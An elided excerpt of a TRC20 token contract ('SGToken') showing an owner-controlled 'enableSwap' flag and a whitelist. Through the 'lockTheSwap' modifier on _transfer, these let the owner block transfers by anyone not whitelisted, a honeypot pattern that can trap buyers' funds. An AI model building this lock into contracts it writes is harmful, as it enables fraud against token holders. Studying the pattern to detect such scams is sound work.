...
contract SGToken is Context, ITRC20, Ownable {
    ...
    uint256 private _totalSupply = 7868 * 10**uint256(_decimals);
    ...
    uint256 public  MAX_STOP_FEE_TOTAL = 2868 * 10**uint256(_decimals);
    ...
    modifier lockTheSwap {
        require(_whiteList[_msgSender()] || enableSwap, "Transfer is not supported temporarily");
        _;
    }
    ...
    function isWhiteList(address account) public onlyOwner view returns (bool) {
    ...
    function setEnableSwap(bool status) public onlyOwner returns(bool) {
        enableSwap = status;
        return true;
    }

    function setWhiteList(address account, bool status) public onlyOwner returns(bool) {
     ...
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual lockTheSwap {
